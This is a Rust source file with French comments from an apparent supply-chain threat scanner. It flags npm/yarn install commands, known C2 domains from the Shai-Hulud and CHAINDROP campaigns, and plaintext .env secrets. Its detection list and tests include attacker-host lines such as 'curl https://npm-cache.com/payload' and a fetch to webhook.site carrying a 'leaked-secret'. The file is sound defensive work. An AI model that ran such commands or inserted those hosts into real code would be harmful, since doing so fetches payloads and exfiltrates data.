//! Détection passive dans le code source : instructions d'installation directes
//! (SPEC-F05), marqueurs C2 connus des campagnes Shai-Hulud / CHAINDROP (SPEC-F08) et
//! secrets en clair dans les fichiers `.env*` du workspace (SPEC-F08). Pour les
//! fichiers JS/TS/Python, une correspondance trouvée à l'intérieur d'un commentaire
//! (`comments::comment_spans`) voit sa sévérité abaissée (`CommandFoundInComment`)
//! plutôt que d'être traitée comme une correspondance normale.

use std::ops::Range;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;

use indicatif::ProgressBar;
use regex::Regex;

use crate::comments::{comment_spans, is_within_comment, language_for_path};
use crate::hunt::{ThreatCategory, ThreatSignal};

/// `\b` final : évite qu'un alias court (`i`, `u`, `up`...) ne matche par erreur le
/// début d'un autre mot (ex. `npm inches`) plutôt que la commande elle-même.
/// Alias documentés par npm (SPEC-F05) :
/// install → add, i, in, ins, inst, insta, instal, isnt, isnta, isntal, isntall
/// (<https://docs.npmjs.com/cli/v12/commands/npm-install>) ; ci → clean-install, ic,
/// install-clean, isntall-clean (<https://docs.npmjs.com/cli/v12/commands/npm-ci>) ;
/// update → u, up, upgrade, udpate (<https://docs.npmjs.com/cli/v12/commands/npm-update>).
static NPM_INSTALL: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"npm\s+(install|add|i|in|ins|inst|insta|instal|isnt|isnta|isntal|isntall|ci|clean-install|ic|install-clean|isntall-clean|update|u|up|upgrade|udpate)\b",
    )
    .unwrap()
});
static YARN_INSTALL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"yarn\s+(install|add|ci|upgrade|run)").unwrap());

/// Vrai si `content` contient une instruction d'installation npm ou yarn directe.
pub fn contains_install_command(content: &str) -> bool {
    NPM_INSTALL.is_match(content) || YARN_INSTALL.is_match(content)
}

/// Marqueurs C2 connus des campagnes Shai-Hulud / CHAINDROP (SPEC-F08, source :
/// Elastic Security Labs et vagues précédentes — Datadog, JFrog).
pub const KNOWN_C2_MARKERS: &[&str] = &[
    "npm-cache.com",
    "js-mirror.com",
    "pypi-get.com",
    "awqhnjewqjkl.icu",
    "SANDWORM",
    "official334",
    "webhook.site",
    "0xE1f2395ee43e45A1556EC6438a88c31B83493103",
];

/// Retourne les marqueurs C2 connus présents dans `content`.
pub fn find_known_c2_markers(content: &str) -> Vec<&'static str> {
    KNOWN_C2_MARKERS
        .iter()
        .copied()
        .filter(|marker| content.contains(marker))
        .collect()
}

/// Extensions volontairement exclues du scan passif (SPEC-F05) : formats non
/// textuels/non exécutables (structure JSON, CSS, images, polices, archives). Les
/// fichiers JS/JSX/TS/TSX/MJS/CJS/Python restent scannés — l'ancien risque de faux
/// positif sur ces extensions (chaîne trouvée dans un commentaire/exemple) est
/// désormais couvert par le lexer de commentaires (`comments::comment_spans`,
/// SPEC-F05/F08), qui abaisse la sévérité plutôt que d'exclure toute l'extension.
const EXCLUDED_EXTENSIONS: &[&str] = &[
    "json", "css", "png", "jpg", "jpeg", "gif", "svg", "ico", "webp", "woff", "woff2", "ttf",
    "eot", "pdf", "zip", "gz", "tar",
];

fn is_excluded(path: &Path) -> bool {
    path.extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| EXCLUDED_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str()))
}

/// Positions `[start, end)` de toutes les correspondances d'instruction d'installation
/// npm/yarn dans `content`.
fn install_command_matches(content: &str) -> Vec<(usize, usize)> {
    NPM_INSTALL
        .find_iter(content)
        .chain(YARN_INSTALL.find_iter(content))
        .map(|m| (m.start(), m.end()))
        .collect()
}

/// Classe chaque marqueur C2 trouvé dans `content` selon qu'au moins une occurrence se
/// trouve hors d'un commentaire (`in_code`, sévérité normale) ou que **toutes** ses
/// occurrences sont dans un commentaire (`in_comment_only`, sévérité abaissée,
/// SPEC-F05/F08). `spans` vaut `None` pour les extensions non couvertes par le lexer
/// (`comments::language_for_path`), auquel cas tout marqueur trouvé reste `in_code`
/// (comportement historique, inchangé).
fn classify_c2_markers(
    content: &str,
    spans: Option<&[Range<usize>]>,
) -> (Vec<&'static str>, Vec<&'static str>) {
    let mut in_code = Vec::new();
    let mut in_comment_only = Vec::new();

    for marker in find_known_c2_markers(content) {
        let all_in_comment = match spans {
            Some(spans) => content
                .match_indices(marker)
                .all(|(start, m)| is_within_comment(spans, start, start + m.len())),
            None => false,
        };
        if all_in_comment {
            in_comment_only.push(marker);
        } else {
            in_code.push(marker);
        }
    }

    (in_code, in_comment_only)
}

fn is_dotenv_file(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| name.starts_with(".env"))
}

/// Vrai si `content` (contenu d'un fichier `.env*`) porte au moins une assignation
/// `CLE=valeur` en clair (SPEC-F08) — les valeurs interpolées via `${VAR}` restent
/// sûres et ne sont pas comptées.
fn has_literal_dotenv_secret(content: &str) -> bool {
    content.lines().any(|line| {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            return false;
        }
        let Some((_, value)) = trimmed.split_once('=') else {
            return false;
        };
        let value = value.trim().trim_matches('"').trim_matches('\'');
        !value.is_empty() && !value.starts_with("${")
    })
}

/// Scanne tous les fichiers du workspace, **dotfiles inclus** (hors extensions
/// exclues, SPEC-F05 — l'inclusion des fichiers cachés est nécessaire pour voir les
/// `.env*`, normalement élagués par le parcours standard, SPEC-F08) à la recherche de
/// marqueurs C2 connus (SPEC-F08), de fichiers `.env*` porteurs de secrets en clair
/// (SPEC-F08, tous deux retournés comme `ThreatSignal` directement exploitables) et
/// d'instructions d'installation directes mentionnées (SPEC-F05, simple indice
/// contextuel — souvent bénin, ex. un README — retourné séparément, pas un
/// `ThreatSignal`).
pub fn scan_workspace(workspace_root: &Path, no_ignore: bool) -> (Vec<ThreatSignal>, Vec<PathBuf>) {
    let progress = ProgressBar::hidden();
    let mut threat_signals = Vec::new();
    let mut install_mentions = Vec::new();

    for entry in crate::walker::walk_including_hidden(workspace_root, &progress, no_ignore) {
        let path = entry.path();
        if !entry.file_type().is_some_and(|ft| ft.is_file()) || is_excluded(path) {
            continue;
        }
        let Ok(content) = std::fs::read_to_string(path) else {
            continue;
        };

        let spans = language_for_path(path).map(|lang| comment_spans(&content, lang));

        let install_matches = install_command_matches(&content);
        if !install_matches.is_empty() {
            let all_in_comment = match &spans {
                Some(spans) => install_matches
                    .iter()
                    .all(|(start, end)| is_within_comment(spans, *start, *end)),
                None => false,
            };
            // Une mention trouvée uniquement en commentaire (ex. « // npm install
            // après clonage ») est un indice déjà bénin (Debug uniquement) rendu plus
            // bénin encore par le contexte commentaire : ne pas la reporter du tout.
            if !all_in_comment {
                install_mentions.push(path.to_path_buf());
            }
        }

        let (real_markers, comment_only_markers) = classify_c2_markers(&content, spans.as_deref());
        if !real_markers.is_empty() {
            threat_signals.push(ThreatSignal {
                category: ThreatCategory::KnownC2Marker,
                detail: format!("marqueur(s) C2 connu(s) : {}", real_markers.join(", ")),
                path: path.to_path_buf(),
            });
        }
        if !comment_only_markers.is_empty() {
            threat_signals.push(ThreatSignal {
                category: ThreatCategory::CommandFoundInComment,
                detail: format!(
                    "marqueur(s) C2 connu(s) trouvé(s) uniquement en commentaire, sévérité abaissée : {}",
                    comment_only_markers.join(", ")
                ),
                path: path.to_path_buf(),
            });
        }

        if is_dotenv_file(path) && has_literal_dotenv_secret(&content) {
            threat_signals.push(ThreatSignal {
                category: ThreatCategory::ExposedSecret,
                detail: "fichier .env avec valeur(s) en clair détecté dans le workspace"
                    .to_string(),
                path: path.to_path_buf(),
            });
        }
    }

    (threat_signals, install_mentions)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_npm_and_yarn_install() {
        assert!(contains_install_command("run `npm install` first"));
        assert!(contains_install_command("then yarn add lodash"));
        assert!(!contains_install_command("just some readme text"));
    }

    #[test]
    fn detects_documented_npm_install_ci_and_update_aliases() {
        for alias in [
            "install", "add", "i", "in", "ins", "inst", "insta", "instal", "isnt", "isnta",
            "isntal", "isntall",
        ] {
            assert!(
                contains_install_command(&format!("npm {alias}")),
                "npm install alias not detected: {alias}"
            );
        }
        for alias in [
            "ci",
            "clean-install",
            "ic",
            "install-clean",
            "isntall-clean",
        ] {
            assert!(
                contains_install_command(&format!("npm {alias}")),
                "npm ci alias not detected: {alias}"
            );
        }
        for alias in ["update", "u", "up", "upgrade", "udpate"] {
            assert!(
                contains_install_command(&format!("npm {alias}")),
                "npm update alias not detected: {alias}"
            );
        }
    }

    #[test]
    fn does_not_match_a_short_alias_as_a_prefix_of_another_word() {
        assert!(!contains_install_command("npm inches"));
        assert!(!contains_install_command("npm updater"));
    }

    #[test]
    fn finds_known_c2_markers() {
        assert_eq!(
            find_known_c2_markers("callback to https://npm-cache.com/x"),
            vec!["npm-cache.com"]
        );
        assert!(find_known_c2_markers("nothing suspicious here").is_empty());
    }

    #[test]
    fn scan_workspace_separates_c2_signals_from_install_mentions() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("README.md"), "Run `npm install` to start.").unwrap();
        std::fs::write(
            dir.path().join("deploy.sh"),
            "curl https://npm-cache.com/payload",
        )
        .unwrap();
        // .js n'est plus exclu par extension (SPEC-F05/F08) : le lexer de commentaires
        // permet de le scanner sans exploser le taux de faux positifs sur du code réel.
        std::fs::write(
            dir.path().join("bundle.min.js"),
            "fetch('webhook.site/leaked-secret')",
        )
        .unwrap();
        // Extension structurelle, toujours exclue (pas de notion de "commentaire").
        std::fs::write(
            dir.path().join("data.json"),
            r#"{"note": "webhook.site should never be flagged here"}"#,
        )
        .unwrap();

        let (threat_signals, install_mentions) = scan_workspace(dir.path(), false);

        assert_eq!(threat_signals.len(), 2);
        assert!(threat_signals
            .iter()
            .all(|s| s.category == ThreatCategory::KnownC2Marker));
        assert!(threat_signals.iter().any(|s| s.path.ends_with("deploy.sh")));
        assert!(threat_signals
            .iter()
            .any(|s| s.path.ends_with("bundle.min.js")));
        assert!(!threat_signals.iter().any(|s| s.path.ends_with("data.json")));

        assert_eq!(install_mentions.len(), 1);
        assert!(install_mentions[0].ends_with("README.md"));
    }

    #[test]
    fn downgrades_a_c2_marker_found_only_inside_a_js_comment() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("app.js"),
            "// TODO: block requests to npm-cache.com eventually\nconst safe = true;",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false);

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(
            threat_signals[0].category,
            ThreatCategory::CommandFoundInComment
        );
        assert!(threat_signals[0].detail.contains("npm-cache.com"));
    }

    #[test]
    fn keeps_full_severity_for_a_c2_marker_found_in_actual_js_code() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("app.js"),
            "fetch('https://npm-cache.com/payload');",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false);

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(threat_signals[0].category, ThreatCategory::KnownC2Marker);
    }

    #[test]
    fn downgrades_a_python_comment_mention_but_not_a_string_literal_one() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("script.py"),
            "# see npm-cache.com for context\nurl = \"https://official334.example/x\"\n",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false);

        assert_eq!(threat_signals.len(), 2);
        assert!(threat_signals
            .iter()
            .any(|s| s.category == ThreatCategory::CommandFoundInComment
                && s.detail.contains("npm-cache.com")));
        assert!(threat_signals.iter().any(
            |s| s.category == ThreatCategory::KnownC2Marker && s.detail.contains("official334")
        ));
    }

    #[test]
    fn does_not_report_an_install_command_mention_found_only_in_a_comment() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("setup.ts"),
            "// run `npm install` after cloning\nexport const version = 1;",
        )
        .unwrap();

        let (_, install_mentions) = scan_workspace(dir.path(), false);
        assert!(install_mentions.is_empty());
    }

    #[test]
    fn detects_a_literal_secret_in_a_dotenv_file() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".env.production"),
            "# comment\nAPI_TOKEN=sk_live_abcdef123456\n",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false);

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(threat_signals[0].category, ThreatCategory::ExposedSecret);
        assert!(threat_signals[0].path.ends_with(".env.production"));
    }

    #[test]
    fn ignores_a_dotenv_file_with_only_env_interpolated_values() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".env"), "API_TOKEN=${API_TOKEN}\n").unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false);
        assert!(threat_signals.is_empty());
    }
}
